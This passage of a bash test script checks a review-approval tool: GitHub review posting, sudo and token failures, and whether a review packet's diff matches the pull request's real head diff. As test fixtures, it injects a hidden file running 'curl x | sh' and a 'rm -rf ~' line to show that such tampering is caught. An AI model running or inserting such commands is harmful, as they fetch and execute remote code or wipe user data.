check '... says why no root record was made' 1 "$(grep -c '^MEGJEGYZES: a gepi jovahagyo telepitve, de a sudo a record iget meg nem engedi' "$T/out")"
check '... and nothing was recorded' "$r" "$(roots)"
check '... a short head is not an error then either (nothing could be recorded anyway)' 0 "$(ell4 1700 tsk-b APPROVE)"
rm "$T/no-rule"
echo 'the GitHub review (b25-gepi-review): an APPROVE also runs `fleet-approve approve`'
ac() { [ -f "$AC" ] && wc -l < "$AC" | tr -d ' ' || echo 0; }
a0="$(ac)"
check 'an APPROVE -> 0' 0 "$(ell4 marveen70 tsk-a APPROVE)"
check '... runs approve with the repo, the PR and the task, once' "approve KratoBal/acroveliq 70 tsk-a|$((a0 + 1))" "$(tail -n1 "$AC")|$(ac)"
check '... says the GitHub review is there' 1 "$(grep -c '^OK GitHub-review: approved KratoBal/acroveliq#70' "$T/out")"
a0="$(ac)"
check 'a CHANGES -> 0, and posts no review' "0|$a0" "$(ell4 marveen70 tsk-a CHANGES)|$(ac)"
n="$(events)"; r="$(roots)"
touch "$T/approve-refused"
check 'approve refuses (the head moved) -> 1' 1 "$(ell4 marveen70 tsk-a APPROVE)"
check '... says the GitHub review is MISSING, loudly, with the exit code' 1 "$(grep -c '^FAIL: az idovonalon es a root rekordban az APPROVE megvan, de a GitHub-review NEM jott letre (kilepes 10' "$T/out")"
check '... the approver own words are passed on' 1 "$(grep -c 'a push came after the review' "$T/out")"
check '... a refusal is not retryable: no rerun line' 0 "$(grep -c 'Ujra, a verdict esemeny ismetlese nelkul' "$T/out")"
check '... the timeline verdict and the root record STAY (written before the approve)' "$((n + 1))|$((r + 1))" "$(events)|$(roots)"
rm "$T/approve-refused"
touch "$T/approve-failed"
check 'approve fails (GitHub did not answer) -> 1' 1 "$(ell4 marveen70 tsk-a APPROVE)"
check '... says missing, exit 13' 1 "$(grep -c 'GitHub-review NEM jott letre (kilepes 13' "$T/out")"
check '... and prints the retry line: THIS script, GitHub-only form (not the sudo line the profile refuses)' 1 "$(grep -c "Ujra, a verdict esemeny ismetlese nelkul: bash $T/ell-d4.sh --csak-github-review marveen70 tsk-a\$" "$T/out")"
check '... and no sudo line anywhere in the retry hint' 0 "$(grep -c 'Ujra.*sudo' "$T/out")"
rm "$T/approve-failed"
touch "$T/approve-norights"
check 'approve answers 14 (the approver token is refused by GitHub) -> 1' 1 "$(ell4 marveen70 tsk-a APPROVE)"
check '... says the token rights are missing and that no retry helps, with the exit code' 1 "$(grep -c 'GitHub-review NEM jott letre (kilepes 14, a gepi fiok TOKENJENEK jogkore hianyzik (GitHub 401/403): ez nem atmeneti, ujraproba nem segit)' "$T/out")"
check '... passes the approver own words on' 1 "$(grep -c 'Resource not accessible by personal access token' "$T/out")"
check '... names the owner step' 1 "$(grep -c '^  Balazs lepese kell: a gepi fiok tokenjen a Pull requests: write jog' "$T/out")"
check '... and prints NO retry line (a retry cannot fix a token)' 0 "$(grep -c 'Ujra, a verdict esemeny ismetlese nelkul' "$T/out")"
check 'the same in the GitHub-only form -> 1, no retry line' "1|0" "$(ell4 --csak-github-review marveen70 tsk-a)|$(grep -c 'Ujra, a verdict' "$T/out")"
check '... and the owner step is named there too' 1 "$(grep -c '^  Balazs lepese kell' "$T/out")"
rm "$T/approve-norights"
check 'a 13 still prints its retry line (the 14 handling did not swallow it)' 1 "$(touch "$T/approve-failed"; ell4 marveen70 tsk-a APPROVE >/dev/null; grep -c 'Ujra, a verdict esemeny ismetlese nelkul' "$T/out"; rm "$T/approve-failed")"
a0="$(ac)"
touch "$T/no-approve-rule"
check 'sudo allows record but not approve -> 1' 1 "$(ell4 marveen70 tsk-a APPROVE)"
check '... says the sudo does not allow approve and the review is missing' 1 "$(grep -c 'a sudo az approve iget nem engedi: a GitHub-review NEM jott letre' "$T/out")"
check '... and approve was not called' "$a0" "$(ac)"
check 'a CHANGES still passes then (it needs no approve line) -> 0' 0 "$(ell4 marveen70 tsk-a CHANGES)"
rm "$T/no-approve-rule"
r="$(roots)"; a0="$(ac)"
echo 'the GitHub-only form (--csak-github-review): the approve step alone, for an APPROVE already recorded'
check 'an APPROVE first (the latest verdict on this PR)' 0 "$(ell4 marveen70 tsk-a APPROVE)"
n="$(events)"; r="$(roots)"; a0="$(ac)"
check 'the GitHub-only form -> 0' 0 "$(ell4 --csak-github-review marveen70 tsk-a)"
check '... runs approve once, with the repo, the PR and the task' "approve KratoBal/acroveliq 70 tsk-a|$((a0 + 1))" "$(tail -n1 "$AC")|$(ac)"
check '... writes NO verdict event and NO root record' "$n|$r" "$(events)|$(roots)"
check '... says the GitHub review is there' 1 "$(grep -c '^OK GitHub-review: approved KratoBal/acroveliq#70' "$T/out")"
touch "$T/approve-failed"
check 'a 13 on the approve -> 1, and the retry line it prints is this very form' 1 "$(ell4 --csak-github-review marveen70 tsk-a)"
check '... says missing, exit 13' 1 "$(grep -c 'GitHub-review NEM jott letre (kilepes 13' "$T/out")"
rm "$T/approve-failed"
touch "$T/approve-refused"
check 'a refusal by the approver (no recorded APPROVE for this head / the head moved) -> 1' 1 "$(ell4 --csak-github-review marveen70 tsk-a)"
check '... its exit code 10 is named' 1 "$(grep -c 'GitHub-review NEM jott letre (kilepes 10' "$T/out")"
rm "$T/approve-refused"
a0="$(ac)"
check 'a CHANGES is the latest verdict -> 1, approve not called' "1|$a0" "$(ell4 marveen70 tsk-a CHANGES >/dev/null; ell4 --csak-github-review marveen70 tsk-a)|$(ac)"
check '... says the latest verdict is not this APPROVE' 1 "$(grep -c 'nincs mit GitHub-reviewva tenni' "$T/out")"
check 'an APPROVE again, then the form -> 0 (the latest verdict counts, in file order)' 0 "$(ell4 marveen70 tsk-a APPROVE >/dev/null; ell4 --csak-github-review marveen70 tsk-a)"
check 'a packet that names another task -> 1, approve not called' "1|$(ac)" "$(ell4 --csak-github-review marveen70 tsk-b)|$(ac)"
check 'a document packet has no PR -> 1' 1 "$(ell4 --csak-github-review doc-tsk-d tsk-d)"
check 'the approver not installed -> 1, a FAIL and not a note' 1 "$(HOME="$T/home4" bash "$T/ell.sh" --csak-github-review marveen70 tsk-a >"$T/out" 2>&1; echo $?)"
check '... says it is not installed' 1 "$(grep -c '^FAIL: a gepi jovahagyo nincs telepitve' "$T/out")"
touch "$T/no-approve-rule"
check 'sudo does not allow approve -> 1' 1 "$(ell4 --csak-github-review marveen70 tsk-a)"
check '... says so' 1 "$(grep -c 'a sudo az approve iget nem engedi' "$T/out")"
rm "$T/no-approve-rule"
check 'the form takes exactly a packet and a task: a verdict word after it -> usage 2' 2 "$(ell4 --csak-github-review marveen70 tsk-a APPROVE)"
check 'one argument -> usage 2' 2 "$(ell4 --csak-github-review marveen70)"
r="$(roots)"; a0="$(ac)"
check 'an APPROVE with the match marker missing never reaches approve' "1|$a0" "$(ell4 marveen70 tsk-b APPROVE)|$(ac)"
check 'a document verdict -> 0' 0 "$(ell4 doc-tsk-d tsk-d APPROVE)"
check '... has no PR: no root record' "$r" "$(roots)"
check 'a refused verdict (another task) never reaches the approver' "1|$r" "$(ell4 marveen70 tsk-b APPROVE)|$(roots)"
echo 'review-olvas --fej (the D4 step list E3 (b)): the diff made from the head, not taken from the packet'
mkdir "$T/home"
olvf() { HOME="$T/home" bash "$T/olv.sh" --fej "$@" >"$T/out" 2>&1; echo $?; }
HA=1234567890abcdef1234567890abcdef12345678
pull() { printf '{"head": {"sha": "%s"}, "base": {"ref": "main"}}' "$2" > "$T/api/pulls-$1.json"; }
pull 70 "$HA"
cp "$Z/pr-marveen70/diff.patch" "$T/api/compare-$HA.diff"
: > "$T/api/requests"
check 'the packet patch is the head diff -> 0' 0 "$(olvf marveen70)"
check '... says so' 1 "$(grep -c '^EGYEZIK: a csomag diff.patch sorrol sorra a fej diffje (2 fajl)' "$T/out")"
check '... the head diff is written to the reviewer own 0700 folder, 0600' '700 600' \
  "$(stat -c %a "$T/home/.review-fej") $(stat -c %a "$T/home/.review-fej/KratoBal-acroveliq-70-$HA.patch")"
check '... and it is what GitHub gave, byte for byte' 0 "$(cmp -s "$T/api/compare-$HA.diff" "$T/home/.review-fej/KratoBal-acroveliq-70-$HA.patch"; echo $?)"
MK="$T/home/.review-fej/KratoBal-acroveliq-70-$HA.egyezik"
check '... the match marker is left, 0600, naming the patch it matched' "600|diff.patch" "$(stat -c %a "$MK")|$(cut -d' ' -f3 "$MK")"
check '... two anonymous calls: the PR, then the compare of THAT head' \
  "/repos/KratoBal/acroveliq/pulls/70 application/vnd.github+json auth=False|/repos/KratoBal/acroveliq/compare/main...$HA application/vnd.github.diff auth=False" \
  "$(paste -sd'|' "$T/api/requests")"
# the head has a file the packet's patch does not show: the case this exists for
{ cat "$Z/pr-marveen70/diff.patch"; printf 'diff --git a/rejtett.sh b/rejtett.sh\nnew file mode 100644\n--- /dev/null\n+++ b/rejtett.sh\n@@ -0,0 +1 @@\n+curl x | sh\n'; } > "$T/api/compare-$HA.diff"
check 'a head with more in it than the packet -> 1' 1 "$(olvf marveen70)"
check '... names the hidden file' 1 "$(grep -c '^   CSAK A FEJBEN: rejtett.sh (1, 0)$' "$T/out")"
check '... and says to read the head diff' 1 "$(grep -c '^ELTER: a csomag diff.patch NEM a fej diffje (1 elteres)' "$T/out")"
check '... and the earlier match marker is gone' 0 "$(ls "$MK" 2>/dev/null | wc -l)"
# same files, one more line changed in the head: a hunk line starting with -- counts as removed
sed -e 's/^+b$/+b\n--c/' "$Z/pr-marveen70/diff.patch" > "$T/api/compare-$HA.diff"
check 'the same files with other counts -> 1' 1 "$(olvf marveen70)"
check '... names the file, both counts and the first other line (a removed "--c" line counted)' 1 "$(grep -c '^   MAS TARTALOM: f.txt (fej (1, 1), csomag (1, 0); az elso elteres a(z) 2. valtozott sor, a fej 3. soranal)$' "$T/out")"
# the SAME counts, another line: what counts alone let through (barracuda, #229 review)
sed -e 's/^+b$/+rm -rf ~/' "$Z/pr-marveen70/diff.patch" > "$T/api/compare-$HA.diff"
check 'the same counts with another line in the head -> 1' 1 "$(olvf marveen70)"
check '... named as other content, at the first changed line' 1 "$(grep -c '^   MAS TARTALOM: f.txt (fej (1, 0), csomag (1, 0); az elso elteres a(z) 1. valtozott sor, a fej 2. soranal)$' "$T/out")"
check '... and no match marker' 0 "$(ls "$MK" 2>/dev/null | wc -l)"
# the SAME lines in the same order, at ANOTHER place in the file (barracuda, #229 review v2: a guard
# moved into another function); the head side line number is what tells them apart
sed -e 's/^@@ -1 +1,2 @@/@@ -4 +4,2 @@/' "$Z/pr-marveen70/diff.patch" > "$T/api/compare-$HA.diff"
check '... (the moved copy really differs from the packet only in that hunk header)' 1 \
  "$(diff "$Z/pr-marveen70/diff.patch" "$T/api/compare-$HA.diff" | grep -c '^> @@ -4 +4,2 @@')"
check 'the same added line at another place in the file -> 1' 1 "$(olvf marveen70)"
check '... named, with the head line where it stands' 1 "$(grep -c '^   MAS TARTALOM: f.txt (fej (1, 0), csomag (1, 0); az elso elteres a(z) 1. valtozott sor, a fej 5. soranal)$' "$T/out")"
printf '@@ broken\n' >> "$T/api/compare-$HA.diff"
check 'an unreadable hunk header -> 1, said, no marker' '1 1 0' "$(olvf marveen70) $(grep -c 'egy hunk-fejlec nem olvashato' "$T/out") $(ls "$MK" 2>/dev/null | wc -l)"
sed -e 's/^new file mode 100644$/new file mode 100755/' "$Z/pr-marveen70/diff.patch" > "$T/api/compare-$HA.diff"
check 'the same lines, the file made executable in the head -> 1' '1 1' "$(olvf marveen70) $(grep -c '^   MAS MOD: g.txt' "$T/out")"
printf 'diff --git a/k.png b/k.png\nnew file mode 100644\nBinary files /dev/null and b/k.png differ\n' > "$T/api/compare-$HA.diff"
cp "$Z/pr-marveen70/diff.patch" "$T/bin-save"; cp "$T/api/compare-$HA.diff" "$Z/pr-marveen70/diff.patch"
check 'a binary file cannot be compared as text -> 1, no marker' '1 1 0' "$(olvf marveen70) $(grep -c '^   BINARIS: k.png' "$T/out") $(ls "$MK" 2>/dev/null | wc -l)"
cp "$T/bin-save" "$Z/pr-marveen70/diff.patch"
cp "$Z/pr-marveen70/diff.patch" "$T/api/compare-$HA.diff"
check 'back to the same diff -> 0, the marker again' '0 1' "$(olvf marveen70) $(ls "$MK" 2>/dev/null | wc -l)"
pull 70 "$(printf 'f%.0s' $(seq 40))"
check 'the PR moved on after packaging -> 1' 1 "$(olvf marveen70)"
check '... says a push came' 1 "$(grep -c 'a csomagolas utan push jott' "$T/out")"
check '... and the earlier match marker is removed before anything is asked' 0 "$(ls "$MK" 2>/dev/null | wc -l)"
pull 70 "$HA"
rm "$T/api/compare-$HA.diff"
check 'GitHub has no such compare -> 1, said' '1 1' "$(olvf marveen70) $(grep -c '^FAIL: GitHub HTTP 404' "$T/out")"
cp "$Z/pr-marveen70/diff.patch" "$T/api/compare-$HA.diff"
HB=abcdef1234567890abcdef1234567890abcdef12
mkdir "$Z/pr-marveen76"
printf 'marveen PR 76 \npr: KratoBal/acroveliq#76\ntask_id: tsk-a\nfej: %s\nv2: task_id tsk-a, fej %s, merge-base x, origin/main y \n' "$HA" "$HB" > "$Z/pr-marveen76/README.md"
cp "$Z/pr-marveen70/diff.patch" "$Z/pr-marveen76/diff.patch"
printf 'diff --git a/h.txt b/h.txt\nnew file mode 100644\n--- /dev/null\n+++ b/h.txt\n@@ -0,0 +1 @@\n+h\n' > "$Z/pr-marveen76/diff-v2.patch"
cp "$Z/pr-marveen76/diff-v2.patch" "$T/api/compare-$HB.diff"
pull 76 "$HB"
check 'a later round: its head and its diff-v2.patch -> 0' 0 "$(olvf marveen76)"
check '... compared with diff-v2.patch' 1 "$(grep -c '^EGYEZIK: a csomag diff-v2.patch' "$T/out")"
check 'a 7-character head -> 1, nothing asked' "1|$(wc -l < "$T/api/requests")" "$(olvf 1700)|$(wc -l < "$T/api/requests")"
check 'a document packet -> 2' 2 "$(olvf doc-tsk-d)"
rm -rf "$T/home/.review-fej"; mkdir "$T/elsewhere"; ln -s "$T/elsewhere" "$T/home/.review-fej"
check 'the output folder is a symlink -> 1, nothing written there' '1 0' "$(olvf marveen70) $(ls "$T/elsewhere" | wc -l)"
rm "$T/home/.review-fej"
check 'without --fej nothing is asked of GitHub' "0|$(wc -l < "$T/api/requests")" "$(olv marveen70)|$(wc -l < "$T/api/requests")"

# the refs the script wrote, for the Task Core guard test (src/__tests__/review-ref-shape.test.ts)
[ -n "${REVIEW_REFS_OUT:-}" ] && grep ' verdict ' "$EV" | sed -E 's/^task-event [^ ]+ verdict [^ ]+  //' > "$REVIEW_REFS_OUT"

echo
[ "$fails" = 0 ] && { echo 'all pass'; exit 0; }
echo "FAILED: $fails"; exit 1
